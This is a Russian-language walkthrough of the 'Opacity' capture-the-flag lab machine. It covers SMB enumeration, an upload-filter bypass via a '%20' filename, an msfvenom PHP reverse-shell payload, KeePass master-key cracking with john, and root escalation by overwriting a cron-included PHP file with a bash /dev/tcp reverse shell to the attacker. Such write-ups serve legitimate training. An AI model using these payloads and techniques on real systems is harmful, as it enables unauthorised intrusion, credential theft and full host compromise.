# Opacity

### Необходимые навыки
- Энумерация SMB и извлечение информации (User Enumeration, Password Policy)
- Понимание и эксплуатация уязвимости Unrestricted File Upload (включая обход фильтров расширений)
- Работа с менеджером паролей KeePass (извлечение и взлом мастер-ключа через `keepass2john`)
- Эскалация привилегий через уязвимости периодических задач (Cron) и небезопасные права доступа к директориям

---

### Разведка и получение начального доступа (Шелл)

Начинаем со сканирования портов. Важно отметить: при использовании `masscan` с высокой скоростью (например, `--rate=1000`) порты 139 и 445 могут быть пропущены. Сканирование через `nmap` или снижение скорости `masscan` показывает более точную картину:

<img width="600" height="500" alt="image" src="https://github.com/user-attachments/assets/ae84e501-24b6-4dde-bf64-a816a626dfc6" />

#### Анализ SMB (порты 139, 445)
Проверяем доступные сетевые папки (шары) при анонимном подключении:

<img width="600" height="180" alt="image" src="https://github.com/user-attachments/assets/19ee6f50-f55d-4e4c-9aad-502990ceb385" />

Интересных файлов нет (только стандартные `print$` и `IPC$`). Однако запуск `enum4linux -a <IP>` позволяет извлечь полезную информацию благодаря слабым настройкам безопасности (Null Session). Мы узнаем:
1. Существование локального пользователя `sysadmin`.
2. Политику паролей: отключена проверка сложности, минимальная длина — 5 символов.

<img width="600" height="71" alt="image" src="https://github.com/user-attachments/assets/edfd234a-5c9c-4de0-9604-91b779732968" />
<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/85d8376b-913d-45d9-bf66-9f22d0257f20" />

Эта информация дает понимание того, какую учетную запись мы будем атаковать (Ubuntu по умолчанию не использует аккаунт `sysadmin`, это кастомный пользователь).

#### Анализ веб-приложения (порт 80)
Переходим на сайт и видим форму авторизации. Тестирование формы на SQL-инъекции (с использованием `sqlmap`) не дает результатов. 

<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/77c33da3-95b4-4260-875c-7b882dc9a3b8" />

Запускаем фаззинг директорий с помощью `ffuf`:
```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
В результатах обнаруживаем скрытую директорию `/cloud`.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/814e717b-73a1-4a33-8f84-a856fc1bdc9b" />

#### Эксплуатация Unrestricted File Upload
На странице `/cloud` реализован функционал загрузки изображений по URL. Поднимаем локальный HTTP-сервер (`python3 -m http.server 80`), указываем наш IP и тестовую картинку. Сервер успешно скачивает изображение и выводит путь к нему на сервере:

<img width="600" height="350" alt="image" src="https://github.com/user-attachments/assets/6d65a9d0-8752-411f-8ff6-e7c9b89e85d6" />

Так как сайт написан на PHP, наша цель — загрузить PHP-шелл. Генерируем полезную нагрузку через `msfvenom`:
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP-атакующего> LPORT=4444 -o rce.php -f raw
```

Попытка прямой загрузки `.php` файла блокируется сервером (реализован белый список расширений, пропускающий только форматы изображений, например `.jpg`, `.png`). 
Для обхода фильтра перехватываем запрос в Burp Suite и манипулируем именем файла. Варианты обхода с `rce.php%00.jpg`, `rce.php.jpg` и `rce.php%0a.jpg` не сработали. 

Успешным оказывается обход с добавлением URL-кодированного пробела (`%20`) после расширения `.php` перед фейковым расширением (или в конце):
`http://<IP-атакующего>/rce.php%20`
*Сервер валидирует строку, но при сохранении файла на файловую систему ОС отбрасывает пробел, оставляя исполняемый `.php` файл.*

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/d3cb2d9a-cb1d-4752-99cf-dc3b99166988" />

Запускаем слушатель (Listener) в `msfconsole`, переходим по ссылке сохраненного файла (`http://<IP>/cloud/images/rce.php`) и получаем Reverse Shell с правами пользователя `www-data`.

---

### Эскалация привилегий (Взятие User)

Мы находимся в системе. Проверка директории `/home/sysadmin/` показывает, что файл `local.txt` с флагом недоступен для чтения. Нам необходимо повысить привилегии до пользователя `sysadmin`.

<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/312537e8-293e-4b51-aa18-fb0698293962" />

В директории `/opt` обнаруживаем зашифрованную базу данных паролей KeePass: `dataset.kdbx`.

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/8002dae2-831e-4293-9c23-ec2851581643" />

Скачиваем этот файл на атакующую машину. Безопасность баз KeePass опирается на сложность мастер-ключа. Если он слабый, его можно взломать брутфорсом. 
Извлекаем хэш мастер-ключа с помощью утилиты `keepass2john`:
```bash
keepass2john dataset.kdbx > hash.txt
```
Запускаем взлом по словарю:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<img width="600" height="80" alt="image" src="https://github.com/user-attachments/assets/3d5aa535-1e2e-4988-85e1-30ab6eaea1c2" />

Пароль (мастер-ключ) успешно найден. Открываем базу `dataset.kdbx` с помощью программы `KeePassXC` и извлекаем учетные данные пользователя `sysadmin`.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/716a6919-a07f-4287-95da-6268d3d8b7e4" />

В SSH-сессии переключаемся на системного администратора:
```bash
su - sysadmin
```
Вводим пароль, получаем доступ к профилю и забираем пользовательский флаг `local.txt`.

---

### Эскалация привилегий (Взятие Root)

В домашней директории пользователя `sysadmin` находится папка `scripts`, к которой мы теперь имеем доступ. В ней лежит файл `script.php`, принадлежащий `root`.

<img width="600" height="220" alt="image" src="https://github.com/user-attachments/assets/2f2922e3-cc50-4b3d-8e9d-3efc71a78ada" />

Анализ кода показывает, что скрипт выполняет резервное копирование и очистку временных файлов. Проверка директории `/var/backups` выявляет, что бэкапы создаются каждую минуту. Это указывает на наличие Cron-задачи, запускающей данный скрипт от имени `root`.

Ключевая строка в `script.php`:
```php
require_once('lib/backup.inc.php');
```
Скрипт подключает внешний файл `lib/backup.inc.php`. Проверяем директорию `lib`:
<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/b75f9b4c-96b2-464a-9b36-e326a79a959e" />

Сам файл `backup.inc.php` принадлежит пользователю `root` (мы не можем его перезаписать напрямую). Однако родительская **директория `lib` принадлежит пользователю `sysadmin`**. 
В Linux право на удаление и создание файлов определяется правами на директорию, в которой они находятся, а не правами на сами файлы.

Мы можем удалить `root`-овский файл и создать на его месте свой собственный вредоносный скрипт:
```bash
rm lib/backup.inc.php
echo "<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/<IP-атакующего>/5555 0>&1'\"); ?>" > lib/backup.inc.php
```

Открываем слушатель (Listener) на порту 5555:
```bash
nc -lvnp 5555
```

В течение минуты Cron-задача `root` запускает `script.php`, который подтягивает наш вредоносный `backup.inc.php`. Мы получаем оболочку с максимальными привилегиями.

<img width="600" height="120" alt="image" src="https://github.com/user-attachments/assets/97b400d9-36d7-4588-802e-1c485dd0b7fb" />

Система полностью скомпрометирована. Флаг `proof.txt` захвачен.
